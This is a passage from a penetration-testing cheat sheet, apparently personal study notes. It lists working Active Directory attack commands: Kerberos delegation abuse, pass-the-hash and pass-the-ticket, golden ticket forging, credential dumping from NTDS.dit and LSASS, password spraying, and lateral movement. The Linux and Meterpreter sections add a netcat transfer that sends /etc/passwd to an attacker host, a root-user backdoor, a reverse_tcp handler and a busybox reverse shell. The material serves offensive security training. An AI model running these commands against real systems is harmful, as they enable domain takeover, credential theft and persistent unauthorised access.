Rubeus.exe tgtdeleg               # Request TGT for current user (if allowed)
Rubeus.exe dump                   # View available tickets
Rubeus.exe ptt /ticket:<base64>  # Pass the ticket to impersonate

# Or with Mimikatz:
sekurlsa::tickets                 # View Kerberos tickets
kerberos::ptt ticket.kirbi        # Inject the stolen ticket

# Extra [Reference Video](https://youtu.be/eDmkkL108W4?si=7mYg-2mDjdF4KWEb&t=339) to capture DC01$ tgt 
Rubeus.exe monitory /interval:10 /filteruser:dc01$
SpoolSample.exe DC01 <delegatedcomputername> # [Tool GitHub](https://github.com/leechristensen/SpoolSample)


# Kali Linux (relaying or extracting from memory dumps):
# Use secretsdump.py if SYSTEM hash is available
impacket-secretsdump -just-dc -k -no-pass domain.com/username@dc-ip
```

##### 🟨 Constrained Delegation Abuse

```powershell
# Explanation:
# A user or computer account is delegated to impersonate others only to specific services (e.g., CIFS).
# If TrustedToAuthForDelegation is enabled, the attacker can impersonate any user (DA) to allowed services.

# Purpose:
# Impersonate Domain Admin to specific service (like CIFS or HTTP) via S4U2Self + S4U2Proxy.

# Windows (use Rubeus to abuse constrained delegation):
# Step 1: Request TGT for compromised user:
Rubeus.exe asktgt /user:svc_account /rc4:<NTLM> /domain:<domain.local>

# Step 2: Request a service ticket to impersonate DA:
Rubeus.exe s4u /user:svc_account /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/targethost /domain:<domain.local> /altservice:cifs

# Optional: Inject the resulting ticket
Rubeus.exe ptt /ticket:<base64>

# Kali Linux (Steps):

# 1. Get TGT for the compromised account with constrained delegation:
getTGT.py -hashes :<NTLM_HASH> <domain>/<user>

# 2. Use TGT to request service ticket for Administrator to a service (e.g., CIFS):
getST.py -impersonate Administrator -spn cifs/<target-fqdn> -hashes :<NTLM_HASH> <domain>/<delegated-user>

# 3. Use resulting .ccache file:
export KRB5CCNAME=Administrator.ccache
klist
impacket-psexec -k -no-pass <domain>/Administrator@<target-ip>


# Not directly useful unless using ntlmrelayx with delegation abuse via LDAP
ntlmrelayx.py -t ldap://dc-ip --delegate-access
```

##### 🟩 Resource-Based Constrained Delegation (RBCD) Abuse
GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack.

```powershell
# Explanation:
# Target computer specifies who can delegate to it (via msDS-AllowedToActOnBehalfOfOtherIdentity).
# If attacker has GenericWrite or WriteDACL on a computer object, they can set their own user/computer as a delegator.

# Purpose:
# Gain ability to impersonate any user (e.g., DA) to that computer via Kerberos (S4U abuse).

# Windows:
# Step 1: Add your user to the target computer’s msDS-AllowedToActOnBehalfOfOtherIdentity:
# Using PowerView or equivalent:
$SID = (Get-DomainUser eviluser).SID
$SD = New-Object System.DirectoryServices.ActiveDirectorySecurity
$ID = New-Object System.Security.Principal.SecurityIdentifier($SID)
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($ID, "GenericAll", "Allow")
$SD.AddAccessRule($ACE)
Set-DomainObject -Identity victim-computer -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SD}

# Or use PowerView's shortcut if you control the user:
Set-DomainObject -Identity victim-computer -Set @{‘msDS-AllowedToActOnBehalfOfOtherIdentity’ = (New-Object System.DirectoryServices.ActiveDirectorySecurity).GetSecurityDescriptorSddlForm(‘All’)}

# Step 2: Perform impersonation:
Rubeus.exe s4u /user:eviluser /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/victim-computer /domain:domain.local

# Kali Linux (Steps):

# 0. Prerequisites:
# You need:
# - A machine account under your control (you can create one)
# - Write access to victim computer object

# 1. Create a new machine account:
impacket-addcomputer <domain>/<user>:<pass> -computer-name 'evilcomp$' -computer-pass 'Ev!lp455' -dc-ip <ip>

# 2. Abuse RBCD by updating victim's msDS-AllowedToActOnBehalfOfOtherIdentity attribute:
# (This allows 'evilcomp' to delegate to the victim machine)
impacket-rbcd -action write -delegate-from 'evilcomp$' -delegate-to 'victim-comp$' -dc-ip <dc-ip> domain.local/<user> -password <pass>

# 3. Use s4u2self + s4u2proxy to impersonate DA to the victim:
impacket-getTGT <domain>/evilcomp\$:'P@ssw0rd!' -dc-ip <dc-ip>

# we can directly get service ticket to get access to cifs which is needed in case of psexec or wmiexec
impacket-getST -spn cifs/victim-comp.domain.local -impersonate Administrator <domain>/evilcomp\$:'Ev!lp455' -dc-ip <dc-ip>

# 4. Pass ticket:
export KRB5CCNAME=Administrator.ccache
klist # to check ticket loaded in the memory
impacket-psexec -k -no-pass <domain>/Administrator@victim-comp.domain.local
```

---
#### ADCS Attacks
```shell
certipy-ad find -u pieter -p 'relayboy22!' -dc-ip 10.10.188.161

# We can search for ESC attack vectors
```
Learn More about it
- [Linkedin Blog](https://www.linkedin.com/pulse/attack-vectors-against-active-directory-certificate-services-patel-bpcyf/)
- [All the ADCS attacks YouTube](https://www.youtube.com/playlist?list=PLUMEY7cBcvDP19HB3qoBO6uTp-wxDFbFX)
#### LDAP Passback Attack
If we identify a service or device configured to connect to an external LDAP server, we can exploit this by replacing the LDAP IP with our own. This allows us to capture credentials via a rogue LDAP server that supports plaintext authentication.
```shell
# Clone this repo [LDAP-passback-docker](https://github.com/pedrojosenavasperez/ldap-passback-docker)
docker build -t ldap-passback .
docker run --rm -ti -p 389:389 ldap-passback  # this also captures the credentials and display it properly 

# With your rogue LDAP server running, run the below command to capture the ldap traffic to see the password
tshark -i any -f "port 389" -Y "ldap.simple" -V
```
### 🚶‍♂️Lateral Movement in  AD
Check: https://www.netexec.wiki/ for more details
#### Initial Access
```shell
# Use netexec to spray to SMB, winrm service, rdp
# Before doing that, check the password policy using `net accounts`
net accounts

netexec smb <ip-range> -u user.txt -p pass.txt --continue-on-success
netexec winrm <ip-range> -u user.txt -p pass.txt --continue-on-success
netexec rdp <ip-range> -u user.txt -p pass.txt -d corp.com --continue-on-success --screenshot --screentime <time> # --nla-screenshot
# no bruteforce for pass spraying
--no-bruteforce --continue-on-success

RunasCs.exe user1 password1 "cmd /c whoami /all"

. .\Inoke-RunasCS
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"

```

#### WMI (port 135)
```shell
# 🚶 Via WMI (135), Target user needs to be in any admin group membership is required and UAC doesn't apply on Domain users so we can get full access
# using cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc" # windows target
# using powershell
$secureString = ConvertTo-SecureString 'pass' -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential 'user', $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
# in kali
impacket-wmiexec test.local/john:password123@10.10.10.1
```

#### WinRM (5985, 5986)
```shell
# 🚶 Via WinRM (5985,5986), domain user needs to be member of Administrators or Remote Management Users group on the target host.
# using cmd
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"  # domain user can only run this
# using powershell
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession <ID> # ID number generated from above 
# in kali
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

#### PsExec (SMB)
```shell
# 🚶 Via psexec (SMB), target user should have Local Admin, ADMIN$ share available and File and Printer Sharing has to be turned on
# using cmd
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
# in kali
impacket-psexec CORP/Administrator:pass@192.168.50.21
```
#### Pass The Hash
```shell
# 🚶 Pass The Hash 
# supported by PsExec, impacket tools and [pth toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
use -hashes in any impacket tools

```

#### OverPass The Hash - Request TGT/TGS using Hash
```shell
# 🚶 OverPass the Hash, Request TGT and TGS using domain user's NTLM hash 
# if NTLM is disabled, If you get STATUS_INVALID_LOGON_TYPE or NTLM blocked → NTLM is disabled during login through SMB service
mimikatz sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
whoami # won't show new user as kerberos ticket requested so use any service then klist
net use \\files04 OR .\PsExec.exe \\files04 cmd OR any cmd
# winrs will gonna through error on this
klist
# if we have rc4, aes128 or aes256  then use /hashname:  in mimikatz

# in kali, OPth
impacket-getTGT -hashes :11223344556677889900aabbccddeeff corp.com/Administrator -dc-ip 192.168.238.7 # > Using an incorrect domain format (e.g., `corp/` instead of `corp.com/`) can cause a `STATUS_MORE_PROCESSING_REQUIRED` error when using the TGT with tools like `impacket-psexec`.
export KRB5CCNAME=Administrator.ccache  # export the ticket to env
klist 
impacket-psexec -k corp.com/Administrator@hostname.corp.com -dc-ip 192.168.238.70 -no-pass # -k for kerberos auth and hostname requires in kerb auth
# in order to setup your kali to use DC as dns for specific domain check out [[Linux & Windows commands#setting up dnsmasq]]
```

#### Pass The Ticket
```shell
# 🚶 Pass the Ticket, requires admin rights to dump tickts from lsass
# impersonate any user through injecting their tickets (TGS or TGT) into our session from LSASS memory
mimikatz> privilege::debug
sekurlsa::tickets /export   # dumps any TGT or TGS from LSASS memory and saves in *.kirbi
# We can see which user has which TGS by analyzing the naming convention of `.kirbi` files.
# to inject any high privileged Ticket into our current session
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  # (TGS used here) we can also use TGT too 
klist # to check tickets in our session

# In Kali
python3 ticketConverter.py dave@cifs-web04.kirbi dave-web04.ccache # first convert the kirbi to ccache (supported by kali)
export KRB5CCNAME=$(pwd)/dave@cifs-web04.ccache   # TGT can be used here, TESTED
klist
impacket-smbclient -k -no-pass corp.com/dave@web04.corp.com -dc-ip 192.168.x.x

# 🚶 thru DCOM, read more about it [[Active Directory Pentesting#DCOM]]
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")


# ALSO CHECK [[#🚪Initial Access]]  and  [[Active Directory Pentesting#Different Access Types]]
```
#### RDP Hijacking
just written for knowledge
we can dump hashes of user as an administrator directly from the memory
```powershell
# Administrator user needed to be logged in thru' RDP
query user
# if any user has the state: Disc
tscon 3 /dest:rdp-tcp#6 # dest should be our session name
```
### Persistence
#### Golden Ticket
```powershell
# 🎫Golden Ticket  -  Needs to compromise domain controller to extract krbtgt hash
# we can forge a TGT using the **krbtgt** hash to gain full control over domain resources.
mimikatz> privilege::debug
lsadump::lsa /patch
# after getting ntlm hash of krbtgt, we can forge tgt in any machine
kerberos::purge  # delete any kerberos tickets
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
# this attack is like overpass the hash attack because getting ticket through hash.

# in kali, ticketer used to created silver/golder ticket
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <SID> -domain corp.com -dc-ip ip Administrator # target user to get privs of
# to get domain SID from kali
rpcclient -U "corp.com/user" dc-ip
rcp> lookupdomain corp.com

export KRB5CCNAME=TICKET.ccache 
klist
impacket-psexec -k corp.com/Administrator@hostname.corp.com -dc-ip 192.168.238.70 -no-pass 
```
#### Shadow Copies
```shell
# 🎫Shadow Copies, creates the copy of NTDS.dit from DC and take system hive
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak  # The exact path before \Windows\... is determined by the vshadow output — make sure to copy it accurately from the command result.
reg.exe save hklm\system c:\system.bak
# on kali, extract the credential using these 2 files
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
#### More
```shell
# Adding new user to /etc/passwd file
nc -nlvp 80 > passwd.bak  # to receive passwd file from victim
nc -nv attacking_IP 80 < /etc/passwd # send


mkpasswd --method=MD5 --stdin    
Password: pass
$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1
# add inside passwd.bak
test:$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1:0:0:Test,,,:/root
# on victim
wget -O /etc/passwd attacking_IP/passwd.bak



```
## Meterpreter (Be Cautious to Use only one 1 Machine)
```shell
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.175;set LPORT 4444;run;"
```

## Important payloads
https://www.revshells.com/
```shell
# Some version of nc doesn't have the -e feature
busybox nc 192.168.45.175 7755 -e /bin/bash  # mostly work on every place as compared to other places 
```
## ☁AWS
### Domain Recon

```bash
# Step 1: Identify the authoritative name servers for the domain
host -t ns offseclab.io
```

```bash
# Step 2: Identify the organization behind the nameserver domain (could reveal AWS or third-party services)
whois <ns-domain> | grep -i "Registrant Organization"
```

> 💡 Note: If the nameserver domain belongs to AWS (e.g., `awsdns-xx.org`), it typically indicates the use of **Route 53** for DNS management.  
> ⚠️ However, this **does not confirm** that the **infrastructure** (e.g., web servers, APIs) is also hosted on AWS.

```bash
# Step 3: Resolve the public IP of the web service (e.g., www.offseclab.io)
host www.offseclab.io
```

```bash
# Step 4: Perform reverse DNS lookup to get the hostname of the resolved IP
host 52.70.117.69
# Expected output:
# 69.117.70.52.in-addr.arpa domain name pointer ec2-52-70-117-69.compute-1.amazonaws.com.
```

> 🔍 The presence of `ec2-*.compute-1.amazonaws.com` in the PTR record strongly suggests the server is an **EC2 instance** hosted in AWS (specifically in the **us-east-1** region).

```bash
# Step 5: Confirm ownership of the IP address using whois
whois 52.70.117.69 | grep -i "OrgName"
# Output: Amazon Technologies Inc.
```

> ✅ This confirms that the resource is hosted on AWS infrastructure.

### Service Specific
#### S3 bucket
This discovery of bucket or objects within the bucket required some creativity and assumptions but shows an example of enumerating cloud resources. The process is also easy to automate by writing a script on our own or searching for an already-built tool like [_cloudbrute_](https://www.kali.org/tools/cloudbrute/) or [_cloud-enum_](https://www.kali.org/tools/cloud-enum/).
```shell
# http://domain/bucket_name
cloud_enum -k bucket_name --quickscan --disable-azure --disable-gcp

# examples
cloud_enum -k offseclab-assets-public --quickscan --disable-azure --disable-gcp
# Because we are testing a specific naming pattern, we'll benefit from building a custom key file.
for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key"; done | tee /tmp/keyfile.txt
cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```
### Enumeration thru API
Authenticate first
```shell
aws configure --profile username  # no need to give the real username, it's just local profile name
# prompts ask for ACCESS_KEY_ID, SECRET_ACCESS_KEY, REGION_NAME, OUTPUT_FORMAT
# to check if authenticated successfully
aws --profile attacker sts get-caller-identity  # to get username, account_id, Arn 
```

Enumerate the below
- Publicly shared [_Amazon Machine Images_](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/AMIs.html) (AMIs)
- Publicly shared [_Elastic Block Storage_](https://aws.amazon.com/ebs/) (EBS) snapshots
- [_Relational Databases_](https://aws.amazon.com/rds/) (RDS) snapshots
```shell
# if there's only one profile no need to mention with every command
# Lists AMIs provided by Amazon
aws --profile username ec2 describe-images --owners amazon --executable-users all
# Lists shared EBS snapshots
aws --profile attacker ec2 describe-snapshots --filters "Name=description,Values=*offseclab*"
# List s3 bucket objects
aws --profile attacker s3 ls bucketname
```
##### Identify the AWS Account ID from a Public S3 Bucket
```shell
# use this tool [s3-account-search](https://github.com/WeAreCloudar/s3-account-search)
s3-account-search arn:aws:iam::<ACCOUNT_ID>:role/s3_read s3://my-bucket 
# identify s3 bucket region by check the value of x-amz-bucket-region header
curl -I https://mega-big-tech.s3.amazonaws.com

# [pwnedLabs.io](https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket)
```
##### To filter & search
```shell

--filters "Name=filter-name,Values=filter-value1,filter-value2,..."
# example
--filters "Name=description,Values=*Offseclab*"

```
